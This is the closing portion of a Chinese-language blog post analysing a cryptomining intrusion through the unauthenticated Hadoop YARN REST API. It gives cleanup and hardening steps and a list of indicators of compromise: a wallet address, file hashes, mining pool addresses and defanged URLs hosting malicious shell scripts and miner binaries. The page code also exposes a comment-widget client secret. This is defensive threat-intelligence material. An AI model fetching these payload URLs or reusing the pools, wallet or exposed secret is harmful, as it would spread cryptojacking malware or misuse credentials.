+<img src="/images/post/hadoop-yarn-rest-api-unauthorized-miner-analysis/673c831c-130a-4094-9791-6d7217fafb88.png">
+<h4 id="四-安全建议"><a class="markdownIt-Anchor" href="#四-安全建议"></a> 四、安全建议</h4>
+<h5 id="清理病毒"><a class="markdownIt-Anchor" href="#清理病毒"></a> 清理病毒</h5>
+<ol>
+<li>使用top查看进程，kill掉异常进程</li>
+<li>检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</li>
+<li>检查crontab任务列表，删除异常任务</li>
+<li>排查YARN日志，确认异常的application，删除处理</li>
+</ol>
+<h5 id="安全加固"><a class="markdownIt-Anchor" href="#安全加固"></a> 安全加固</h5>
+<ol>
+<li>通过iptables或者安全组配置访问策略，限制对8088等端口的访问</li>
+<li>如无必要，不要将接口开放在公网，改为本地或者内网调用</li>
+<li>升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问</li>
+<li>云镜当前已支持该漏洞检测，同时也支持挖矿木马的发现，建议安装云镜并开通专业版，及时发现漏洞并修复或者在中马后能及时收到提醒进行止损</li>
+<li>更多自检和修复建议可以参考 <a href="http://bbs.qcloud.com/thread-50090-1-1.html" target="_blank" rel="noopener">http://bbs.qcloud.com/thread-50090-1-1.html</a></li>
+</ol>
+<h4 id="五-iocs"><a class="markdownIt-Anchor" href="#五-iocs"></a> 五、IOCs</h4>
+<ul>
+<li>
+<p>钱包地址</p>
+<ul>
+<li>4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg</li>
+</ul>
+</li>
+<li>
+<p>MD5</p>
+<ul>
+<li>c8c1f2da51fbd0aea60e11a81236c9dc</li>
+<li>183664ceb9c4d7179d5345249f1ee0c4</li>
+<li>b00f4bbd82d2f5ec7c8152625684f853</li>
+</ul>
+</li>
+<li>
+<p>矿池地址</p>
+<ul>
+<li>158.69.133.20:3333</li>
+<li>192.99.142.249:3333</li>
+<li>202.144.193.110:3333</li>
+<li>46.30.43.159:80</li>
+</ul>
+</li>
+<li>
+<p>部分相关URL</p>
+<ul>
+<li>hxxp://185.222.210.59/x_wcr.sh</li>
+<li>hxxp://185.222.210.59/re.php</li>
+<li>hxxp://185.222.210.59/g.php</li>
+<li>hxxp://185.222.210.59/w.conf</li>
+<li>hxxp://185.222.210.59/cr.sh</li>
+<li>hxxp://192.99.142.226:8220/w.conf</li>
+<li>hxxp://192.99.142.226:8220/xm64</li>
+<li>hxxp://192.99.142.226:8220/cr.sh</li>
+<li>hxxp://95.142.40.83/xm64</li>
+<li>hxxp://95.142.40.83/xm32</li>
+<li>hxxps://transfer.sh/1o3Kj/zzz</li>
+<li>hxxps://transfer.sh/wbl5H/pscf</li>
+<li>hxxps://transfer.sh/WoGXx/zzz</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#一-背景"><span class="toc-text"> 一、 背景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二-漏洞说明"><span class="toc-text"> 二、 漏洞说明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#三-入侵分析"><span class="toc-text"> 三、入侵分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#四-安全建议"><span class="toc-text"> 四、安全建议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#清理病毒"><span class="toc-text"> 清理病毒</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#安全加固"><span class="toc-text"> 安全加固</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#五-iocs"><span class="toc-text"> 五、IOCs</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/linux-redis-miner-worm-analysis/" rel="next" title="Linux Redis自动化挖矿感染蠕虫分析及安全建议">
+          Linux Redis自动化挖矿感染蠕虫分析及安全建议
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/linux-hide-process-miner-analysis/" rel="prev" title="Linux 遭入侵，挖矿进程被隐藏案例分析">
+            Linux 遭入侵，挖矿进程被隐藏案例分析
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <div id="gitalk-container"></div>
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: 'fa567664f6bdb5976298',
+            clientSecret: 'ee096f560d4360445220f5063af3bf6e4a8ba8e5',
+            id: window.location.pathname,
+            repo: 'fooying_blog',
+            owner: 'fooying',
+            admin: 'fooying'
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <a class="bottom-item" href="https://github.com/fooying" target="_blank">GitHub</a> |
+        <a class="bottom-item" href="/links">友情链接</a> |
+        <a class="bottom-item" href="https://hexo.io" target="_blank">Powered by hexo</a> |
+        <a class="bottom-item" href="https://github.com/fooying/hexo-theme-xoxo-plus" target="_blank">Theme xoxo-plus</a> |
+        <a class="bottom-item" href="/atom.xml">订阅</a>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function () {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?f290e5fbd596aedbb751f38a7d377f48";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
